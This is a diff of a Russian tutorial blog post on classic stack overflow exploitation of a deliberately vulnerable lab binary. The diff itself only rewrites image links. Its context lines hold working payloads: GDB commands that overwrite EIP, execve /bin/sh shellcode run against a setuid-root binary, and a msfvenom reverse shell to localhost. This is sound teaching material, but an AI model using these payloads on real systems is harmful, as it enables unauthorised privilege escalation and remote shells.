@@ -38,7 +38,7 @@ published: true
 > 3. [ROP-цепочки и атака Return-to-PLT в CTF Bitterman](https://snovvcrash.github.io/2019/11/23/bitterman.html)
 > 4. [Return-to-bss, криптооракулы и реверс-инжиниринг против Великого Сокрушителя](https://snovvcrash.github.io/2019/12/20/htb-smasher.html)
 
-![banner.png]({{ "/assets/images/pwn-kingdom/classic-stack-overflow/banner.png" | relative_url }})
+![banner.png](/assets/images/pwn-kingdom/classic-stack-overflow/banner.png)
 {: .center-image}
 
 * TOC
@@ -124,7 +124,7 @@ $ gcc -g -Wall -Werror -O0 -m32 -fno-stack-protector -z execstack -no-pie -Wl,-z
 
 Вспомним картинку, которую рисовали каждому юному девелоперу, демонстрирующую расположение данных в стеке. Для конкретики возьмем наш заведомо уязвимый исходник.
 
-[![stack-layout-main-boundary-2.png]({{ "/assets/images/pwn-kingdom/classic-stack-overflow/stack-layout-main-boundary-2.png" | relative_url }})]({{ "/assets/images/pwn-kingdom/classic-stack-overflow/stack-layout-main-boundary-2.png" | relative_url }})
+[![stack-layout-main-boundary-2.png](/assets/images/pwn-kingdom/classic-stack-overflow/stack-layout-main-boundary-2.png)](/assets/images/pwn-kingdom/classic-stack-overflow/stack-layout-main-boundary-2.png)
 {: .center-image}
 
 Два важных регистра процессора, которые участвуют в формировании стекового кадра, — это **ESP** и **EBP**.
@@ -257,7 +257,7 @@ $ echo "source ~/peda/peda.py" >> ~/.gdbinit
 
 В PEDA доступен такой замечательный модуль, как `checksec`. Он поможет определить, какие механизмы безопасности активны в данный момент для данного исполняемого файла.
 
-[![gdb-peda-checksec.png]({{ "/assets/images/pwn-kingdom/classic-stack-overflow/gdb-peda-checksec.png" | relative_url }})]({{ "/assets/images/pwn-kingdom/classic-stack-overflow/gdb-peda-checksec.png" | relative_url }})
+[![gdb-peda-checksec.png](/assets/images/pwn-kingdom/classic-stack-overflow/gdb-peda-checksec.png)](/assets/images/pwn-kingdom/classic-stack-overflow/gdb-peda-checksec.png)
 {: .center-image}
 
 * `CANARY` — защитник стека от переполнения, который мы отключили настройкой `-fno-stack-protector`.
@@ -303,17 +303,17 @@ $ echo "source ~/peda/peda.py" >> ~/.gdbinit
 
 Запустим отладчик (с опцией `-q` для подавления вывода начального приветствия) и сгенерим строку в 200 байт, чтобы быть уверенным, что переполнение точно произойдет.
 
-[![gdb-peda-pattern-create.png]({{ "/assets/images/pwn-kingdom/classic-stack-overflow/gdb-peda-pattern-create.png" | relative_url }})]({{ "/assets/images/pwn-kingdom/classic-stack-overflow/gdb-peda-pattern-create.png" | relative_url }})
+[![gdb-peda-pattern-create.png](/assets/images/pwn-kingdom/classic-stack-overflow/gdb-peda-pattern-create.png)](/assets/images/pwn-kingdom/classic-stack-overflow/gdb-peda-pattern-create.png)
 {: .center-image}
 
 С помощью команды `run <СТРОКА>` (как я уже говорил, почти все команды в GDB сокращаются до одной буквы для удобства, поэтому `r` — это `run`) запустим программу на выполнение, передав в качестве аргумента сгенерированный паттерн.
 
-[![gdb-peda-run.png]({{ "/assets/images/pwn-kingdom/classic-stack-overflow/gdb-peda-run.png" | relative_url }})]({{ "/assets/images/pwn-kingdom/classic-stack-overflow/gdb-peda-run.png" | relative_url }})
+[![gdb-peda-run.png](/assets/images/pwn-kingdom/classic-stack-overflow/gdb-peda-run.png)](/assets/images/pwn-kingdom/classic-stack-overflow/gdb-peda-run.png)
 {: .center-image}
 
 В результате увидим такое приятное глазу окно ассистента PEDA (чистый GDB без «обвесов», в свою очередь, был бы очень не многословен), в котором сразу видно, какие значения приняли все важные для нас регистры. После чего, снова используя модуль pattern, рассчитаем смещение, как `pattern offset 0x6c414150`, передав значение EIP, которое имел регистр на момент ошибки сегментации.
 
-[![gdb-peda-pattern-offset.png]({{ "/assets/images/pwn-kingdom/classic-stack-overflow/gdb-peda-pattern-offset.png" | relative_url }})]({{ "/assets/images/pwn-kingdom/classic-stack-overflow/gdb-peda-pattern-offset.png" | relative_url }})
+[![gdb-peda-pattern-offset.png](/assets/images/pwn-kingdom/classic-stack-overflow/gdb-peda-pattern-offset.png)](/assets/images/pwn-kingdom/classic-stack-overflow/gdb-peda-pattern-offset.png)
 {: .center-image}
 
 Получили 132, что означает, что мы были правы в нашем предположении выше.
@@ -412,7 +412,7 @@ gdb-peda$ b *0x0804844d
 gdb-peda$ r `python -c 'print "A"*132 + "\xd3\x4d\xc0\xd3"[::-1]'`
 ```
 
-[![gdb-peda-breakpoint-1.png]({{ "/assets/images/pwn-kingdom/classic-stack-overflow/gdb-peda-breakpoint-1.png" | relative_url }})]({{ "/assets/images/pwn-kingdom/classic-stack-overflow/gdb-peda-breakpoint-1.png" | relative_url }})
+[![gdb-peda-breakpoint-1.png](/assets/images/pwn-kingdom/classic-stack-overflow/gdb-peda-breakpoint-1.png)](/assets/images/pwn-kingdom/classic-stack-overflow/gdb-peda-breakpoint-1.png)
 {: .center-image}
 
 Так как мы остановились перед выполнением `ret`, то значение «мертвый код» находится на вершине стека (выделено красным), т. е. в ESP, откуда он попал бы в регистр EIP, если бы мы не прервали выполнение. Также обрати внимание, что сейчас EIP равен той самой точке останова (выделено синим).
@@ -423,7 +423,7 @@ gdb-peda$ r `python -c 'print "A"*132 + "\xd3\x4d\xc0\xd3"[::-1]'`
 gdb-peda$ x/64wx $esp-132
 ```
 
-[![gdb-peda-stack-layout-1.png]({{ "/assets/images/pwn-kingdom/classic-stack-overflow/gdb-peda-stack-layout-1.png" | relative_url }})]({{ "/assets/images/pwn-kingdom/classic-stack-overflow/gdb-peda-stack-layout-1.png" | relative_url }})
+[![gdb-peda-stack-layout-1.png](/assets/images/pwn-kingdom/classic-stack-overflow/gdb-peda-stack-layout-1.png)](/assets/images/pwn-kingdom/classic-stack-overflow/gdb-peda-stack-layout-1.png)
 {: .center-image}
 
 Давай разберемся, что я здесь изобразил:
@@ -439,7 +439,7 @@ gdb-peda$ x/64wx $esp-132
 gdb-peda$ c
 ```
 
-[![gdb-peda-continue-1.png]({{ "/assets/images/pwn-kingdom/classic-stack-overflow/gdb-peda-continue-1.png" | relative_url }})]({{ "/assets/images/pwn-kingdom/classic-stack-overflow/gdb-peda-continue-1.png" | relative_url }})
+[![gdb-peda-continue-1.png](/assets/images/pwn-kingdom/classic-stack-overflow/gdb-peda-continue-1.png)](/assets/images/pwn-kingdom/classic-stack-overflow/gdb-peda-continue-1.png)
 {: .center-image}
 
 Теперь можно приступать к боевым действиям. Грубый эксплоит для выполнения из интерактивной оболочки GDB выглядит так (чуть позже сделаем это более красиво и без необходимости запускать отладчик).
@@ -458,7 +458,7 @@ $ sudo chgrp root overflow
 $ sudo chmod +s overflow
 ```
 
-[![gdb-peda-dash-id-1.png]({{ "/assets/images/pwn-kingdom/classic-stack-overflow/gdb-peda-dash-id-1.png" | relative_url }})]({{ "/assets/images/pwn-kingdom/classic-stack-overflow/gdb-peda-dash-id-1.png" | relative_url }})
+[![gdb-peda-dash-id-1.png](/assets/images/pwn-kingdom/classic-stack-overflow/gdb-peda-dash-id-1.png)](/assets/images/pwn-kingdom/classic-stack-overflow/gdb-peda-dash-id-1.png)
 {: .center-image}
 
 Таким образом мы создали новый процесс, в котором запустился шелл `/bin/dash` (dash, кстати, на Debian и Ubuntu заменил собой старинный `/bin/sh`, который, в свою очередь, превратился лишь в симлинк на `/bin/dash`).
@@ -471,7 +471,7 @@ $ sudo chmod +s overflow
 
 К примеру, если я передаю строку из 1000 дополнительных байт после перезаписи адреса возврата, то ловлю ошибку неизвестной природы из функции ptmalloc_init.
 
-[![gdb-peda-arena-c-error.png]({{ "/assets/images/pwn-kingdom/classic-stack-overflow/gdb-peda-arena-c-error.png" | relative_url }})]({{ "/assets/images/pwn-kingdom/classic-stack-overflow/gdb-peda-arena-c-error.png" | relative_url }})
+[![gdb-peda-arena-c-error.png](/assets/images/pwn-kingdom/classic-stack-overflow/gdb-peda-arena-c-error.png)](/assets/images/pwn-kingdom/classic-stack-overflow/gdb-peda-arena-c-error.png)
 {: .center-image}
 
 Произошло это из-за того, что я беспардонно вторгся на территорию области памяти, с которой уже работали другие функции, и начал наводить там свои порядки — перезаписывать значения своими данными. GDB использует вспомогательные библиотеки для вывода более информативных сообщений об ошибках в случаях, когда программа падает. Если временно отключить использование этих библиотек (в нашем варианте отладочная информация все равно не слишком полезна), можно убедиться, что разделяемая библиотека стандартных функций Си `libc` жалуется на то, что мы затронули уже занятую ей память.
@@ -483,7 +483,7 @@ The directory where separate debug symbols are searched for is "/usr/lib/debug".
 gdb-peda$ set debug-file-directory  // временно отключаем ее использование
 ```
 
-[![gdb-peda-libc-so-error.png]({{ "/assets/images/pwn-kingdom/classic-stack-overflow/gdb-peda-libc-so-error.png" | relative_url }})]({{ "/assets/images/pwn-kingdom/classic-stack-overflow/gdb-peda-libc-so-error.png" | relative_url }})
+[![gdb-peda-libc-so-error.png](/assets/images/pwn-kingdom/classic-stack-overflow/gdb-peda-libc-so-error.png)](/assets/images/pwn-kingdom/classic-stack-overflow/gdb-peda-libc-so-error.png)
 {: .center-image}
 
 Методом «Пол, Палец, Потолок» выясняем, что при перезаписи 160 байтов за пределами стека ничего плохого не происходит.
@@ -492,14 +492,14 @@ gdb-peda$ set debug-file-directory  // временно отключаем ее 
 gdb-peda$ r `python -c 'print "A"*132 + "\xd3\x4d\xc0\xd3"[::-1] + "B"*160'`
 ```
 
-[![gdb-peda-libc-160-bytes-no-error.png]({{ "/assets/images/pwn-kingdom/classic-stack-overflow/gdb-peda-libc-160-bytes-no-error.png" | relative_url }})]({{ "/assets/images/pwn-kingdom/classic-stack-overflow/gdb-peda-libc-160-bytes-no-error.png" | relative_url }})
+[![gdb-peda-libc-160-bytes-no-error.png](/assets/images/pwn-kingdom/classic-stack-overflow/gdb-peda-libc-160-bytes-no-error.png)](/assets/images/pwn-kingdom/classic-stack-overflow/gdb-peda-libc-160-bytes-no-error.png)
 {: .center-image}
 
 Поэтому ради разнообразия сгенерируем пейлоад с помощью метасполитовского `msfvenom` и посмотрим на заполнении стека при таком размещении шелл-кода.
 
 Для этого переместимся на Kali и посмотрим список доступных полезных нагрузок для Linux x86, которые не ориентируются на использование meterpreter (которого в нашем распоряжении на Ubuntu нет).
 
-[![kali-payloads.png]({{ "/assets/images/pwn-kingdom/classic-stack-overflow/kali-payloads.png" | relative_url }})]({{ "/assets/images/pwn-kingdom/classic-stack-overflow/kali-payloads.png" | relative_url }})
+[![kali-payloads.png](/assets/images/pwn-kingdom/classic-stack-overflow/kali-payloads.png)](/assets/images/pwn-kingdom/classic-stack-overflow/kali-payloads.png)
 {: .center-image}
 
 Я выбрал реверс-шелл linux/x86/shell_reverse_tcp. Сгенерируем его, указав в качестве жертвы localhost на 1337 порту и закодировав нагрузку с помощью [энкодера](https://xakep.ru/2018/12/14/msfvenom/#toc03.1) x86/shikata_ga_nai для увеличения размера кода.
@@ -530,14 +530,14 @@ python -c 'print "A"*132 + "\xbf\xff\xed\xcc"[::-1] + "\x90"*32 + "\xbe\xaf\x6c\
 
 А стек после внедрения шелл-кода примет следующий вид.
 
-[![gdb-peda-stack-layout-2.png]({{ "/assets/images/pwn-kingdom/classic-stack-overflow/gdb-peda-stack-layout-2.png" | relative_url }})]({{ "/assets/images/pwn-kingdom/classic-stack-overflow/gdb-peda-stack-layout-2.png" | relative_url }})
+[![gdb-peda-stack-layout-2.png](/assets/images/pwn-kingdom/classic-stack-overflow/gdb-peda-stack-layout-2.png)](/assets/images/pwn-kingdom/classic-stack-overflow/gdb-peda-stack-layout-2.png)
 {: .center-image}
 
 Здесь практически все то же самое, что и на первом рисунке анализа стека за исключением того, что полезная нагрузка теперь находится после ESP. Но при этом мы также «прыгаем» ровно на середину предваряющего шелл-код NOP-среза (адрес `0xbfffedcc`), а зеленым снова выделено заполнение стека junk-символами «A»: `1 байт = Доступная_память_после_ESP - NOP_срез*2 - Шелл_код = 160 - 32*2 - 95`.
 
 Оставив локального слушателя на 1337 порту, я запустил программу, подав на вход вредоносную строку, и получил свой шелл.
 
-[![gdb-peda-dash-id-2.png]({{ "/assets/images/pwn-kingdom/classic-stack-overflow/gdb-peda-dash-id-2.png" | relative_url }})]({{ "/assets/images/pwn-kingdom/classic-stack-overflow/gdb-peda-dash-id-2.png" | relative_url }})
+[![gdb-peda-dash-id-2.png](/assets/images/pwn-kingdom/classic-stack-overflow/gdb-peda-dash-id-2.png)](/assets/images/pwn-kingdom/classic-stack-overflow/gdb-peda-dash-id-2.png)
 {: .center-image}
 
 ## Эксплоит без GDB
@@ -713,7 +713,7 @@ End of assembler dump.
 
 Из-за дополнительного значения регистра ECX, которое должно быть куда-то сохранено, рисунок, демонстрирующий устройство стека для функции `main` изменится.
 
-[![stack-layout-main-boundary-4.png]({{ "/assets/images/pwn-kingdom/classic-stack-overflow/stack-layout-main-boundary-4.png" | relative_url }})]({{ "/assets/images/pwn-kingdom/classic-stack-overflow/stack-layout-main-boundary-4.png" | relative_url }})
+[![stack-layout-main-boundary-4.png](/assets/images/pwn-kingdom/classic-stack-overflow/stack-layout-main-boundary-4.png)](/assets/images/pwn-kingdom/classic-stack-overflow/stack-layout-main-boundary-4.png)
 {: .center-image}
 
 Посмотрим, как эти изменения скажутся на эксплуатации.
@@ -724,7 +724,7 @@ End of assembler dump.
 
 Сгенерирую уникальный паттерн длиной 200 символов для надежности и попробую отыскать расстояние до EIP.
 
-[![gdb-peda-boundary-4-ebp-esp-eip.png]({{ "/assets/images/pwn-kingdom/classic-stack-overflow/gdb-peda-boundary-4-ebp-esp-eip.png" | relative_url }})]({{ "/assets/images/pwn-kingdom/classic-stack-overflow/gdb-peda-boundary-4-ebp-esp-eip.png" | relative_url }})
+[![gdb-peda-boundary-4-ebp-esp-eip.png](/assets/images/pwn-kingdom/classic-stack-overflow/gdb-peda-boundary-4-ebp-esp-eip.png)](/assets/images/pwn-kingdom/classic-stack-overflow/gdb-peda-boundary-4-ebp-esp-eip.png)
 {: .center-image}
 
 * EIP вообще указывает, казалось бы, на случайный адрес.
@@ -751,7 +751,7 @@ gdb-peda$ pattern offset 0x6c414150
 
 Другой интересный случай для анализа тот, где я передам паттерн длиной ровно в 132 байта — объем памяти, выделенной под буфер.
 
-[![gdb-peda-boundary-4-eip.png]({{ "/assets/images/pwn-kingdom/classic-stack-overflow/gdb-peda-boundary-4-eip.png" | relative_url }})]({{ "/assets/images/pwn-kingdom/classic-stack-overflow/gdb-peda-boundary-4-eip.png" | relative_url }})
+[![gdb-peda-boundary-4-eip.png](/assets/images/pwn-kingdom/classic-stack-overflow/gdb-peda-boundary-4-eip.png)](/assets/images/pwn-kingdom/classic-stack-overflow/gdb-peda-boundary-4-eip.png)
 {: .center-image}
 
 Казалось бы, что произошло чудо, ведь EIP успешно переполнился, и я даже могу посчитать смещение.
@@ -774,7 +774,7 @@ gdb-peda$ b *0x0804846b
 gdb-peda$ r `python -c 'print "A"*136'`
 ```
 
-[![gdb-peda-boundary-4-get-esp.png]({{ "/assets/images/pwn-kingdom/classic-stack-overflow/gdb-peda-boundary-4-get-esp.png" | relative_url }})]({{ "/assets/images/pwn-kingdom/classic-stack-overflow/gdb-peda-boundary-4-get-esp.png" | relative_url }})
+[![gdb-peda-boundary-4-get-esp.png](/assets/images/pwn-kingdom/classic-stack-overflow/gdb-peda-boundary-4-get-esp.png)](/assets/images/pwn-kingdom/classic-stack-overflow/gdb-peda-boundary-4-get-esp.png)
 {: .center-image}
 
 У меня есть нужно значение: `ESP: 0xbfffedc0`. Теперь я просто увеличу его на 4, эмулируя тем самым действия компилятора, и перезапишу EIP на «мертвый код» такой вредоносной строкой.
@@ -783,7 +783,7 @@ gdb-peda$ r `python -c 'print "A"*136'`
 gdb-peda$ r `python -c 'print "\xd3\x4d\xc0\xd3"[::-1] + "A"*128 + "\xbf\xff\xed\xc4"[::-1]'`
 ```
 
-[![gdb-peda-boundary-4-poc-eip-overwrite.png]({{ "/assets/images/pwn-kingdom/classic-stack-overflow/gdb-peda-boundary-4-poc-eip-overwrite.png" | relative_url }})]({{ "/assets/images/pwn-kingdom/classic-stack-overflow/gdb-peda-boundary-4-poc-eip-overwrite.png" | relative_url }})
+[![gdb-peda-boundary-4-poc-eip-overwrite.png](/assets/images/pwn-kingdom/classic-stack-overflow/gdb-peda-boundary-4-poc-eip-overwrite.png)](/assets/images/pwn-kingdom/classic-stack-overflow/gdb-peda-boundary-4-poc-eip-overwrite.png)
 {: .center-image}
 
 Мой пейлоад для данной ситуации принял вид `Адрес_возврата + Мусор + ESP`. Значение ESP было уменьшено ассемблерным кодом на 4, помещено в регистр ECX, откуда, в свою очередь, был восстановлен оригинальный стек, вершина которого указывала на начало «мусорной» строки — `0xd34dc0d3`.
@@ -808,7 +808,7 @@ payload = ret_addr + nop_sled + shellcode + nop_sled + junk + saved_esp
 gdb-peda$ r `python -c 'print "\xbf\xff\xed\xd4"[::-1] + "\x90"*32 + "\x6a\x46\x58\x31\xdb\x31\xc9\xcd\x80\x31\xd2\x6a\x0b\x58\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80" + "\x90"*32 + "A"*31 + "\xbf\xff\xed\xc4"[::-1]'`
 ```
 
-[![gdb-peda-boundary-4-dash-id.png]({{ "/assets/images/pwn-kingdom/classic-stack-overflow/gdb-peda-boundary-4-dash-id.png" | relative_url }})]({{ "/assets/images/pwn-kingdom/classic-stack-overflow/gdb-peda-boundary-4-dash-id.png" | relative_url }})
+[![gdb-peda-boundary-4-dash-id.png](/assets/images/pwn-kingdom/classic-stack-overflow/gdb-peda-boundary-4-dash-id.png)](/assets/images/pwn-kingdom/classic-stack-overflow/gdb-peda-boundary-4-dash-id.png)
 {: .center-image}
 
 Победа, игра окончена.
